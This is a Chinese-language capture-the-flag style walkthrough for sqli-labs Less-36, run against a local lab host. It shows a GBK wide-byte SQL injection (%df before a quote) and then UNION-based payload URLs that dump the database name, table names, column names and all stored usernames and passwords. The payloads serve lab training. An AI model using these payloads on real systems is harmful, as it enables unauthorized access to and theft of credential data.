---
title: Less - 36
date: 2023-03-17T19:42:29Z
lastmod: 2023-03-20T18:09:34Z
---

# Less - 36

---

# 通关教程

---

## 1、判断闭合

---

```http
http://192.168.23.128/sqli-labs/Less-36/?id=1%27
```

​![image](assets/image-20230320132155-kv14zsc.png)​

查看源代码看看这关是否使用了GBK编码

​![image](assets/image-20230320132533-6pbxtph.png)​

确定使用了GBK编码，使用%df让单引号成功逃逸就可以了

```http
http://192.168.23.128/sqli-labs/Less-36/?id=1%df'
```

​![image](assets/image-20230320132618-ulqfhlu.png)​

通过错误信息判断闭合方式为'--+，并且为字符型注入

---

## 2、查看当前数据库名

---

```http
http://192.168.23.128/sqli-labs/Less-36/?id=-1%df' union select 1,2,database()--+           
```

​![image](assets/image-20230320132741-gdm1alp.png)​

---

## 3、查看security库下的所有表

---

```http
http://192.168.23.128/sqli-labs/Less-36/?id=-1%df' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+
```

​![image](assets/image-20230320180738-l2asxty.png)​

---

## 4、查看users表下的所有字段

---

```http
http://192.168.23.128/sqli-labs/Less-36/?id=-1%df' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)--+
```

​![image](assets/image-20230320180830-8trbsnf.png)​

---

## 5、查看username,password字段下的所有值

---

```http
http://192.168.23.128/sqli-labs/Less-36/?id=-1%df' union select 1,2,(select group_concat(username,password) from security.users)--+
```

​![image](assets/image-20230320180922-tvqmogb.png)​

‍
